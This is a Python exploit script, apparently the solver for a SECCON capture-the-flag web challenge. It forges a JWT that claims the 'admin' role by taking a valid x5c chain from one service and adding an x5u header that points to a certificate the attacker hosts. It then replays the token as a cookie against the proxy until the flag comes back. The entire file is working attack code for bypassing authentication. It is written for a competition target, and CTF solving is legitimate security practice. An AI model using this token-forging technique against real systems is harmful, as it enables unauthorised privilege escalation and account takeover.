import os
import jwt
import requests
from time import sleep

# NOTE: 同ディレクトリの solver.crt は適当な URL で公開しておく
EVIL_CERT_URL = "https://gist.githubusercontent.com/lmt-swallow/9b9f07fbede7f2e5b1a2c0d8fc7cfd33/raw/46fc75f96b50bde260241647f27357119a7d5fc1/solver.crt"

PROXY_BASE = "https://pasta01.chal.seccon.jp"
SERVICE_B_BASE = "https://pasta02.chal.seccon.jp"

def extract_valid_x5c_of_b():
    r = requests.post(SERVICE_B_BASE, data={
        id: "hoge"
    }, allow_redirects=False)
    if 'location' not in r.headers:
        print("error")
        exit(1)

    auth_token = r.headers['location'].split('?token=')[1]
    headers = jwt.get_unverified_header(auth_token)
    return headers['x5c']

if __name__ == '__main__':
    valid_x5c = extract_valid_x5c_of_b()

    with open('solver.key', 'rb') as f:
        signing_key = f.read()

    payload = {
        "sub": "solver",
        "issuer": "evil",
        "role": "admin",
    }
    token = jwt.encode(payload, signing_key, algorithm='RS256', headers={
        "x5u": EVIL_CERT_URL,
        "x5c": valid_x5c,
    }).decode()

    for _ in range(0, 60):
        r = requests.get(PROXY_BASE, headers={
            "Cookie": "auth_token="+token,
        })
        if 'SECCON{' in r.text:
            print(r.text)
            exit(0)
        else:
            print("failed. going to retry after waiting 1s...")
            sleep(1)

    exit(1)
